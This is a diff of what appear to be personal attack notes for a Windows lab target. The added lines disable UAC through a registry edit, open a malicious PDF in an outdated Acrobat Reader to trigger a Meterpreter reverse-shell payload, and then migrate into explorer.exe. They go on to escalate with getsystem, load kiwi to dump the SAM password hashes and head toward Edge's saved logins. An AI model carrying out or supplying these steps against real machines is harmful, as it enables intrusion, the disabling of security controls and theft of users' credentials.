@@ -21,8 +21,25 @@ sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/r
 
 
 In windows 
-In firewall exclude exe and pdf
-open the local email sever download the pdf, open it in the poutdated acrobat reader, then open it it will ask to save the payload `form` save it int e document file (this is the default of the payload or need to chnage it)
+Prepare for this work:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+shutdown /r /t 0
+
+After restart, in firewall exclude exe and pdf
+open the local email sever download the pdf, open it in the outdated acrobat reader, then open it it will ask to save the payload `form` save it int e document file (this is the default of the payload or need to change it)
+
+
+Find fresh x64 explorer.exe PID owned by current user
+ps | grep explorer
+or 
+pgrep explorer
+
+migrate <PID>
+getsystem
+getuid    
+
+load kiwi
+lsa_dump_sam
 
 
 Get the Edge saved login credentials>>
